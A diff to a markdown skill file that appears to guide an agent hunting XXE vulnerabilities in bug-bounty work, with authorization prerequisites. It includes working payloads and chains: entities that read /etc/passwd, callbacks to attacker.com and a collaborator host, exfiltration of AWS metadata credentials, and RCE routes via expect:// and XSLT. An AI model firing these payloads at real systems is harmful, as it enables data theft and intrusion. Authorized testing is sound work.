@@ -4,9 +4,40 @@ description: "Hunting skill for xxe vulnerabilities. Built from 10 public bug bo
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [xxe, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [xxe, hunt, redteam]
+  category: redteam
 ---
+
+## When to Use
+
+- Hunting XXE on any target — emphasis on OOB-Or-It-Didn't-Happen Gate for blind cases.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Original JSON request
+curl --max-time 30 --connect-timeout 10 -X POST https://target.com/api/endpoint \
+  -H "Content-Type: application/json" \
+  -d '{"user":"test"}'
+
+# Converted to XML for XXE testing
+curl --max-time 30 --connect-timeout 10 -X POST https://target.com/api/endpoint \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -90,7 +121,7 @@ lxml
 
 5. **Escalate Blind OOB to file exfiltration** — Use a two-stage payload: first entity loads local file, second entity sends it OOB via HTTP parameter or DNS exfiltration.
 
-6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://[REDACTED_IP]/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.
+6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://169.254.169.254/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.
 
 7. **Test all subdomains sharing the same backend** — If one subdomain is vulnerable, enumerate and test all others systematically. Shared backend infrastructure means shared vulnerability.
 
@@ -152,7 +183,7 @@ lxml
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY ssrf SYSTEM "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/">
+  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
 ]>
 <root><data>&ssrf;</data></root>
 ```
@@ -306,7 +337,7 @@ XXE classic payloads (`<!ENTITY xxe SYSTEM "file://...">`) are not universally e
 | .NET `XmlDocument` with `XmlResolver` explicitly set | Expands | **YES** |
 | .NET `XmlReader` with `DtdProcessing=Parse` + `XmlResolver` explicitly set | Expands | **YES** (default since .NET 4.5.2 is `DtdProcessing.Prohibit`, which THROWS on any DOCTYPE — modern default is safe) |
 | Python `xml.etree.ElementTree` ≥ 3.7.1 | SYSTEM disabled | NO |
-| Python `lxml` (verified 6.x; likely ≥ 5.x) | Drops SYSTEM file content even with `resolve_entities=True`; may still issue network fetches when `no_network=False` | NO for file read (verified locally on 6.1.0 — see `docs/verification/phase2g-saml-mfa-xxe.md`) |
+| Python `lxml` (verified 6.x; likely ≥ 5.x) | Drops SYSTEM file content even with `resolve_entities=True`; may still issue network fetches when `no_network=False` | NO for file read (verified locally on 6.1.0 during skill development) |
 | Python `xml.dom.minidom` | Default safe in current versions | NO |
 | Python `defusedxml.lxml` | Disabled | NO |
 | Ruby Nokogiri default | Disabled | NO |
@@ -378,7 +409,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 7. **Zivver — SVG profile-picture upload XXE → SSRF** ([H1 #897244](https://hackerone.com/reports/897244))
     - Subclass: SVG-upload XXE, OOB-confirmed, chains to SSRF
-    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://[REDACTED_IP]/latest/meta-data/">]><text>&xxe;</text>`
+    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><text>&xxe;</text>`
     - Root cause: server thumbnailed uploaded SVG with an XML parser that resolved external entities; no entity-resolver shutdown
     - Year: 2020 — Zivver had no paid program at the time
 
@@ -402,30 +433,6 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 ---
 
-## Verification
-
-Run this self-test to confirm xxe hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-xxe" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **XXE in SVG upload** — SVG files are XML. XXE in uploaded SVG is a valid attack vector. Test with SVG containing `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
 - **XXE with no output (blind XXE)** — if the parser doesn't return entity values, use OOB XXE (`<!ENTITY xxe SYSTEM "http://attacker.com/">`) to trigger callbacks.
@@ -435,9 +442,17 @@ All 3 tests verify the skill is properly structured and ready for use.
 
 ---
 
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
+
+---
+
 ## Related Skills & Chains
 
-- **`hunt-ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
+- **`hunt-ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
 - **`hunt-file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
 - **`hunt-rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
 - **`hunt-sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
